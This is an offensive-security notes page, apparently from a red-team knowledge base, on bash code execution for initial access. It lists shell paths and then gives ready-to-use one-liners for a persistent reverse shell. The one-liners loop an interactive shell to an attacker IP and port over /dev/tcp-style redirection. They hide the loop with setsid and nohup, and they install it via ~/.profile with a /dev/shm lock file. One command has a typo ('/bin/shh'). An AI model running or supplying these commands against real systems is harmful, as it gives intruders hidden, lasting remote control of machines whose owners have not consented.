---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - T1059-004
  - linux
---
# Manual

## 01 - Common Files

Refer to this [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Cross Platform/Code Execution/Bash/Manual|section]] of the maximum characters limit.

```
/bin/sh
/usr/bin/sh
/bin/dash
/usr/bin/dash
```

## 02 - Execute Payloads

### 2.1 - Persistent Callback Shell

In case you might lose the callback connection. It's better to make it persistent.

```
$ while true; do /bin/shh -c /path/to/payload; sleep 10; done

$ while true; do /bin/sh -i >& /dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1; sleep 10; done

$ setsid bash -c 'while :; do sh -i &>/dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1; sleep 360; done' &>/dev/null
```

Prevents multiple instances while written in `~/.profile`.

```
$ fuser /dev/shm/.busy &>/dev/null || nohup /bin/sh -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; sh -i &>/dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1 ; sleep 360; done' &>/dev/null &
```

---
## References

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html)